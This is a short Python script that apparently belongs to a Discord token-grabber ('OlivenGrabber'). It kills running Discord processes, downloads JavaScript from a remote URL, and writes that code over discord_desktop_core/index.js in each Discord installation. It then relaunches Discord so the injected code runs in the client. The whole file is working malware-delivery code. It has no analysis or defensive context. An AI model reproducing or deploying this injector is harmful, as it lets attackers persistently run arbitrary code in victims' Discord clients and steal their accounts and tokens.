import os

import psutil
import requests

injecturl = ""
injectcode = requests.get(injecturl).text


def findcords():
    cords = []
    for item in os.listdir(os.getenv('LOCALAPPDATA')):
        if 'cord' in item:
            cords.append(item)
    return cords


def getindex(item):
    global path
    local = os.path.join(os.getenv('LOCALAPPDATA'), item)
    try:
        for dir1 in os.listdir(local):
            if 'app-' in dir1:
                dir1 = os.path.join(local, dir1)
                for app in os.listdir(dir1):
                    app = os.path.join(local, dir1, app)
                    if 'modules' in app:
                        for item in os.listdir(app):
                            item = os.path.join(local, dir1, app, item)
                            if 'discord_desktop_core' in item:
                                try:
                                    os.mkdir(item + '\\discord_desktop_core\\OlivenGrabber')
                                except:
                                    pass
                                path = item + '\\discord_desktop_core\\index.js'
    except Exception as e:
        path = 'Discord Not Found: ' + str(e)
    return str(path)


def killcord():
    for proc in psutil.process_iter():
        try:
            if 'iscord' in proc.name():
                proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass


def inject():
    killcord()
    for item in findcords():
        if 'Light' in str(item):
            break
        with open(getindex(item), 'w') as file:
            file.write(injectcode.replace('\n', ''))
        local = os.path.join(os.getenv('LOCALAPPDATA'), item)
        for exfile in os.listdir(local):
            if '.exe' in exfile:
                exfile = os.path.join(os.getenv('LOCALAPPDATA'), item, exfile)
                print(exfile)
                os.system(exfile + ' --processStart Discord.exe')

inject()
